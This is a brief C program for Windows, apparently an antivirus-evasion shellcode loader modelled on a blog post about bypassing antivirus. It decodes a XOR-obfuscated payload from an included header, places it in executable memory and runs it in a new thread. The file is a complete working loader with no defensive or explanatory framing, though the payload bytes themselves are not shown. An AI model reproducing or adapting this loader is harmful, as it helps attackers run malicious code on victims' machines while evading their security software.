// inspired by blogpost at http://www.attactics.org/2016/03/bypassing-antivirus-with-10-lines-of.html

#include <windows.h>
#include "payload-xored.h"

int main(int argc, char **argv) {
    char c[sizeof buf];
    for (int i = 0; i < sizeof buf; i++) {c[i] = buf[i] ^ 'x';}
    void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, c, sizeof c);
    //((void(*)())exec)();
    HANDLE h = CreateThread(0, 0, exec, 0, 0, NULL);
    WaitForSingleObject(h, -1);
    return 0;
}
